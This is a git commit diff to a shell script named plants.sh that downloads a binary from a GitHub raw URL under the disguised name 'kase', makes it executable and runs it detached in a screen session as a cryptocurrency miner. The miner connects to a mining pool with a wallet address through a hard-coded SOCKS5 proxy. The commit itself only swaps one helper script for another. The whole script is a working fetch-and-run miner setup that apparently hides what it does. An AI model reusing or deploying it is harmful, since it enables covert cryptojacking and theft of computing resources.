f3a81ae6253fc4b5e5117dc05befc88472a9bf11
hndouehdw <95325562+hndouehdw@users.noreply.github.com>
2021-12-16 00:41:12 +0700

    Update plants.sh

--- plants.sh
+++ plants.sh
@@ -5,6 +5,6 @@ wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
 chmod +x jobs.sh
 chmod +x kase
 screen -dm -S kase ./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://192.252.208.70:14282
-./compile.sh
+./jobs.sh
 
 echo success
